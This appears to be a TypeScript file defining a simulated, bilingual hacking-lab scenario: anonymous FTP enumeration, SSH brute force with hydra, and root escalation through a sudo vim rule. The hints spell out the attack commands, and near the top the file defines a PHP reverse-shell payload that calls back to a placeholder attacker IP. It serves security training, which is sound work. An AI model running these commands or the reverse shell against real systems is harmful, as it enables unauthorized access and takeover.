// ── laboratorios/laboratorio05.ts ───────────────────────────────────────
// Scenario 5 — FTP Enumeration + Brute Force + Privilege Escalation
// Flujo: nmap → ftp anonymous → get → cat → hydra → ssh → escalada

import type { Machine, Scenario, Port } from '../types';
import { buildScenario, createFile, createLinuxFileSystem } from './templates';

export const COMMON_PORTS = {
  ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
  ftp: (version = 'vsFTPd 3.0.3'): Port => ({ port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version }),
  http: (version = 'Apache httpd 2.4.41'): Port => ({ port: 80, protocol: 'tcp', state: 'open', service: 'http', version }),
};

const REVERSE_SHELL_PAYLOAD = {
  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
};

// Datos específicos para el escenario FTP + Brute Force + Privilege Escalation
const scenario05Data = {
  id: 'scenario-05',
  name: 'FTP Enumeration & Privilege Escalation',
  // Metadata for LandingPage cards
  tagline: 'Access via SSH as limited user and escalate privileges exploiting sudo vim.',
  taglineEs: 'Accedé por SSH como usuario limitado y escalá privilegios explotando sudo vim.',
  description: 'Enumeration via anonymous FTP, SSH brute force with Hydra and privilege escalation to root.',
  descriptionEs: 'Enumeración mediante FTP anónimo, fuerza bruta SSH con Hydra y escalada de privilegios a root.',
  tools: ['arp-scan', 'nmap', 'ssh', 'sudo'],
  accentColor: '#34d399',
  networkRange: '10.10.20.0/24',
  credentials: {
    user: 'john',
    pass: 'ilovelinux',
  },
  flags: {
    user: 'ZIL{FTP_ANON_ACCESS}',
    root: 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}',
  },
  targetMachine: {
    id: 'lab-scenario-05-target',
    hostname: 'privesc-server',
    mac: '08:00:27:E8:F9:0A',
    os: 'Debian 11 (Bullseye)',
    type: 'server',
    ports: [
      { port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version: 'vsFTPd 3.0.3' },
      { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu' },
    ],
    ftpNoteEs: `Para: john
De: Equipo de Seguridad
Fecha: 2024-03-15

URGENTE: John, el sistema de monitoreo reportó que tu contraseña de SSH es extremadamente débil y vulnerable a ataques de fuerza bruta. 

Por favor, cambiala cuanto antes a una contraseña más segura. El equipo de seguridad recomienda usar al menos 12 caracteres con mayúsculas, minúsculas y números.

Nota: Esta nota se deja aquí en el FTP anónimo temporalmente hasta que configuremos un sistema de tickets más seguro.`,
    ftpNoteEn: `To: john
From: Security Team
Date: 2024-03-15

URGENT: John, the monitoring system reported that your SSH password is extremely weak and vulnerable to brute force attacks.

Please change it as soon as possible to a more secure password. The security team recommends using at least 12 characters with uppercase, lowercase, and numbers.

Note: This note is left here on anonymous FTP temporarily until we configure a more secure ticketing system.`,
    files: [
      // Archivo en FTP anónimo - ambos idiomas
      { path: '/srv/ftp/nota.txt', content: `Para: john
De: Equipo de Seguridad
Fecha: 2024-03-15

URGENTE: John, el sistema de monitoreo reportó que tu contraseña de SSH es extremadamente débil y vulnerable a ataques de fuerza bruta. 

Por favor, cambiala cuanto antes a una contraseña más segura. El equipo de seguridad recomienda usar al menos 12 caracteres con mayúsculas, minúsculas y números.

Nota: Esta nota se deja aquí en el FTP anónimo temporalmente hasta que configuremos un sistema de tickets más seguro.`, type: 'text' },
      { path: '/srv/ftp/note.txt', content: `To: john
From: Security Team
Date: 2024-03-15

URGENT: John, the monitoring system reported that your SSH password is extremely weak and vulnerable to brute force attacks.

Please change it as soon as possible to a more secure password. The security team recommends using at least 12 characters with uppercase, lowercase, and numbers.

Note: This note is left here on anonymous FTP temporarily until we configure a more secure ticketing system.`, type: 'text' },
      // Archivos del sistema
      { path: '/etc/sudoers', content: `# /etc/sudoers
# This file MUST be edited with the 'visudo' command as root.
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# User privilege specification
root            ALL=(ALL:ALL) ALL

# Allow john to run vim como root sin password
john       ALL=(ALL) NOPASSWD: /usr/bin/vim`, type: 'text' },
      { path: '/root/flag2.txt', content: 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}', type: 'text' },
      { path: '/home/john/user.txt', content: 'ZIL{FTP_ANON_ACCESS}', type: 'text' },
      { path: '/home/john/.bash_history', content: `sudo -l
cat /etc/sudoers
whoami`, type: 'text' },
      { path: '/home/john/.ssh/id_rsa', content: '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2x5z9k8vL...', type: 'text' },
    ],
  },
  learningSteps: [
    { id: 1, task: 'Host Discovery', taskEs: 'Descubrimiento de host', text: 'Discover the active host on the network', textEs: 'Descubrí el host activo en la red', discoveryLevel: 1, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Use arp-scan to discover hosts', es: 'Usá arp-scan para descubrir hosts' }, hint2: { en: 'arp-scan 10.10.20.0/24', es: 'arp-scan 10.10.20.0/24' } } },
    { id: 2, task: 'Port Scanning', taskEs: 'Escaneo de puertos', text: 'Identify the services running on the target', textEs: 'Identificá los servicios que corren en el objetivo', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Use nmap for port scanning', es: 'Usá nmap para escanear puertos' }, hint2: { en: 'nmap -sV <target-ip>', es: 'nmap -sV <ip-objetivo>' } } },
    { id: 3, task: 'Anonymous FTP Access', taskEs: 'Acceso FTP anónimo', text: 'Connect to the FTP server with anonymous access', textEs: 'Conectate al servidor FTP con acceso anónimo', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Connect using FTP client', es: 'Conectate usando el cliente FTP' }, hint2: { en: 'ftp <ip> then login as: anonymous', es: 'ftp <ip> luego logueate como: anonymous' } } },
    { id: 4, task: 'Download Note', taskEs: 'Descargar nota', text: 'List and download the note file from FTP', textEs: 'Listá y descargá el archivo de nota desde FTP', discoveryLevel: 0, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Use FTP commands to navigate', es: 'Usá comandos FTP para navegar' }, hint2: { en: 'ls to list, get nota.txt to download', es: 'ls para listar, get nota.txt para descargar' } } },
    { id: 5, task: 'Read Note', taskEs: 'Leer nota', text: 'Exit FTP and read the downloaded note', textEs: 'Salí del FTP y leé la nota descargada', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Type exit to leave FTP session', es: 'Escribí exit para salir de la sesión FTP' }, hint2: { en: 'cat nota.txt', es: 'cat nota.txt' } } },
    { id: 6, task: 'SSH Brute Force', taskEs: 'Fuerza bruta SSH', text: 'Perform a brute force attack to get john\'s SSH credentials', textEs: 'Realizá un ataque de fuerza bruta para obtener las credenciales SSH de john', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Use hydra for brute force attack', es: 'Usá hydra para el ataque de fuerza bruta' }, hint2: { en: 'hydra -l john -P rockyou.txt <ip> ssh', es: 'hydra -l john -P rockyou.txt <ip> ssh' } } },
    { id: 7, task: 'SSH Access', taskEs: 'Acceso SSH', text: 'Connect via SSH using the found credentials', textEs: 'Conectate por SSH usando las credenciales encontradas', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Connect via SSH with credentials', es: 'Conectate por SSH con las credenciales' }, hint2: { en: 'ssh john@<ip>', es: 'ssh john@<ip>' } } },
    { id: 8, task: 'Sudo Enumeration', taskEs: 'Enumeración de sudo', text: 'Check your sudo permissions on the system', textEs: 'Verificá tus permisos de sudo en el sistema', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Check sudo permissions', es: 'Verificá los permisos de sudo' }, hint2: { en: 'sudo -l', es: 'sudo -l' } } },
    { id: 9, task: 'Privilege Escalation', taskEs: 'Escalada de privilegios', text: 'Exploit sudo permissions to escalate to root', textEs: 'Explotá los permisos sudo para escalar a root', discoveryLevel: 4, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: 'Exploit sudo permissions on vim', es: 'Explotá los permisos sudo de vim' }, hint2: { en: "sudo vim -c '!bash'", es: "sudo vim -c '!bash'" } } },
    { id: 10, task: 'Capture Root Flag', taskEs: 'Capturar flag root', text: 'Read the root flag to complete the lab', textEs: 'Leé la flag de root para completar el laboratorio', discoveryLevel: 4, targetMachineId: 'lab-scenario-05-target', hints: { hint1: { en: "You're root! Read the flag file", es: '¡Sos root! Leé el archivo de la flag' }, hint2: { en: 'cat /root/flag2.txt', es: 'cat /root/flag2.txt' } } },
  ],
};

// Template específico para FTP + Privilege Escalation
export const SCENARIO_TEMPLATES = {
  ftpPrivesc: () => ({
    id: scenario05Data.id,
    name: scenario05Data.name,
    description: scenario05Data.descriptionEs,
    difficulty: 'Medium' as const,
    category: 'Network' as const,
    networkRange: scenario05Data.networkRange,
    targetMachine: {
      id: scenario05Data.targetMachine.id,
      machine_info: {
        hostname: scenario05Data.targetMachine.hostname,
        mac: scenario05Data.targetMachine.mac,
        os: scenario05Data.targetMachine.os,
        status: 'up',
        type: scenario05Data.targetMachine.type,
      },
      discovery_level: 0,
      scan_results: { ports: [] },
      learning_steps: [],
      ports: [
        scenario05Data.targetMachine.ports[0],
        { ...scenario05Data.targetMachine.ports[1], credentials: scenario05Data.credentials },
      ],
      web_enumeration: {
        web_server: 'none',
        cms: 'none',
        directories: [],
      },
      files: [
        ...createLinuxFileSystem({ username: scenario05Data.credentials.user }),
        createFile('/srv/ftp/nota.txt', scenario05Data.targetMachine.ftpNoteEs, 'text'),
        createFile('/srv/ftp/note.txt', scenario05Data.targetMachine.ftpNoteEn, 'text'),
        createFile('/etc/sudoers', `# /etc/sudoers
# This file MUST be edited with the 'visudo' command as root.
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# User privilege specification
root            ALL=(ALL:ALL) ALL

# Allow ${scenario05Data.credentials.user} to run vim como root sin password
${scenario05Data.credentials.user}       ALL=(ALL) NOPASSWD: /usr/bin/vim`, 'text'),
        createFile('/root/flag2.txt', scenario05Data.flags.root),
        createFile(`/home/${scenario05Data.credentials.user}/user.txt`, scenario05Data.flags.user),
        createFile(`/home/${scenario05Data.credentials.user}/.bash_history`, `sudo -l
cat /etc/sudoers
whoami`, 'text'),
        createFile(`/home/${scenario05Data.credentials.user}/.ssh/id_rsa`, '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2x5z9k8vL...', 'text'),
      ],
    },
    learningSteps: scenario05Data.learningSteps.map(({ id: _id, targetMachineId: _t, ...rest }) => rest),
  }),
};

// Export data for metadata access
export { scenario05Data };

export const scenario_05: Scenario = buildScenario(SCENARIO_TEMPLATES.ftpPrivesc());
